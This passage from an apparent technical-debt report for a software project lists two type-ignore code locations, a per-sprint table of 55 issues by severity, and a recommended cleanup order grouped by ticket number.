- `app/api/routers/audit.py:74` — `type: ignore[arg-type]` on sink kind
- `app/plugins/registry.py:164,172` — `type: ignore[call-arg]` on plugin instantiation

---

## Severity Breakdown by Sprint

| Sprint | Critical | High | Medium | Low | Total |
|--------|----------|------|--------|-----|-------|
| S12 (Plugins I) | — | 2 | 3 | 6 | 11 |
| S13 (Plugins II / MCP) | 2 | 1 | 2 | 1 | 6 |
| S14a (Skills / Soul) | 1 | — | 3 | 1 | 5 |
| S14b (Notifications / Budget / Audit / Lock / Backup / Export) | 1 | 5 | 10 | 17 | 33 |
| **Total** | **4** | **8** | **18** | **25** | **55** |

S14b has the highest absolute count (33) due to 6 new modules introduced simultaneously.

---

## Recommended Cleanup Order

1. **Security hardening** (TD-138–144, 147, 150–155, 157) — 14 items, blocks deployment
2. **Critical correctness** (TD-140, 141, 146) — 3 items, silent failures / data loss
3. **Performance & async** (TD-148, 160, 165–167, 169, 170) — 7 items
4. **Concurrency** (TD-158, 159) — 2 items, write serialization
5. **Bug fixes** (TD-156, 161–164, 178, 181) — 7 items
6. **API consistency** (TD-168, 183, 187, 188) — 4 items
7. **Design & code quality** (TD-149, 171–173, 180, 185, 186, 189, 190) — 9 items
8. **Low-priority** (remaining) — 9 items
